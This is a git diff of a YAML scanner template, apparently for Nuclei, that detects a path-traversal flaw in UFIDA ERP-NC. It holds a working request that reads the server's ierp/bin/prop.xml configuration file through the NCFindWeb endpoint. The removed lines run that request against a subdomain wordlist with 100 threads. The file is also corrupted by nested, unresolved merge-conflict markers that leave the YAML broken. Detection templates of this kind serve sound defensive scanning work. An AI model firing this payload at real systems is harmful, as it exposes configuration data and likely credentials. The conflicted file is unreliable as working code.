@@ -6,11 +6,14 @@ info:
   severity: high
   description: |
 <<<<<<< HEAD
+<<<<<<< HEAD
         A general document of UFIDA ERP-NC contains a vulnerability
         (affecting a large number of well-known school government and enterprise cases
         such as COFCO/Minsheng E-commerce/Tsinghua University/Aigo)
   tags: lfi
 =======
+=======
+>>>>>>> 18ddf72b (add new stuff)
     Wooyun is vulnerable to local file inclusion.
   reference:
     - https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
@@ -19,21 +22,16 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,wooyun
+<<<<<<< HEAD
 >>>>>>> 5d36d276 (add new stuff)
+=======
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
 
-    raw:
-      - |
-        GET /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: status
@@ -45,9 +43,15 @@ requests:
           - </DataSourceClassName>
         part: body
 <<<<<<< HEAD
+<<<<<<< HEAD
         condition: and
 =======
         condition: and
 
 # Enhanced by mp on 2022/07/29
 >>>>>>> 5d36d276 (add new stuff)
+=======
+        condition: and
+
+# Enhanced by mp on 2022/07/29
+>>>>>>> 18ddf72b (add new stuff)
